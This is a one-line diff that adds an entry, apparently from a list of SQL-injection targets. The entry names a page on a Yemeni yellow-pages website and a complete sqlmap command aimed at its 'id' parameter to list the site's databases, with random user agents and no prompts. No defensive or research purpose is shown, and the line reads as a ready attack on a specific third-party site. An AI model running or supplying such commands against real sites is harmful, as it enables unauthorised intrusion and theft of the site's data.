@@ -1,0 +1,1 @@
+http://www.yemen-yellowpages.com/ar/subcats.php?id=1 (GET)  # sqlmap.py -u http://www.yemen-yellowpages.com/ar/subcats.php?id=1 --random-agent --batch --dbs
